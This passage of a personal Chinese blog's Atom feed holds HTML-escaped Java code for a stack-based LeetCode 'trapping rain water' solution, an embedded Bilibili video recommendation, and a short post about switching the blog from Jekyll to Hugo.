&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// in the stack, we push the index of array&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// using height[] to access the real height&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Stack&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Integer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Stack&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Integer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stackTop&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;peek&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stackTop&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stackTop&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 因为相等的相邻墙，左边一个是不可能存放雨水的，所以pop左边的index, push当前的index&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//pop up all lower value&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heightAtIdx&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isEmpty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heightAtIdx&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stackTop&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isEmpty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;peek&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hold&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hold&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hold&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stackTop&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;peek&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;p&gt;最后推荐一个大佬的视频，这个大佬每次周赛都是前几名




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV1Qg411q7ia&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    &lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E7%AE%97%E6%B3%95/" term="算法" label="算法" />
                            
                        
                    
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/%E7%AE%97%E6%B3%95/" term="算法" label="算法" />
                            
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/tags/leetcode/" term="leetcode" label="leetcode" />
                            
                        
                    
                
            
        </entry>
    
        <entry>
            <title type="text">哇咔咔，我又回来了</title>
            <link rel="alternate" type="text/html" href="https://xuoneyuan.github.io/posts/1/" />
            <id>https://xuoneyuan.github.io/posts/1/</id>
            <updated>2023-11-13T18:50:00&#43;08:00</updated>
            <published>2023-11-08T20:48:18&#43;08:00</published>
            <author>
                    <name>falcone</name>
                    <uri>https://xuoneyuan.github.io/</uri>
                    <email>xuoneyuan@gmail.com</email>
                    </author>
            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">如标题所见，时隔100天，我又开始记录我自己的博客了 这次我更换了框架，使用了hugo……</summary>
            
                <content type="html">&lt;p&gt;如标题所见，时隔100天，我又开始记录我自己的博客了&lt;/p&gt;
&lt;p&gt;这次我更换了框架，使用了hugo替换了之前的Jekyll，这一改变会让我写博客更加高效简洁&lt;/p&gt;
&lt;p&gt;写下这段文字的时候网站应该还属于测试阶段，不过马上就要上线了，敬请期待&lt;/p&gt;
</content>
            
            
            
            
            
                
                    
                        
                            
                            
                            
                                <category scheme="https://xuoneyuan.github.io/categories/%E6%9D%82%E6%96%87/" term="杂文" label="杂文" />
                            
                        
                    
                
                    
                        
                            
                            
                            
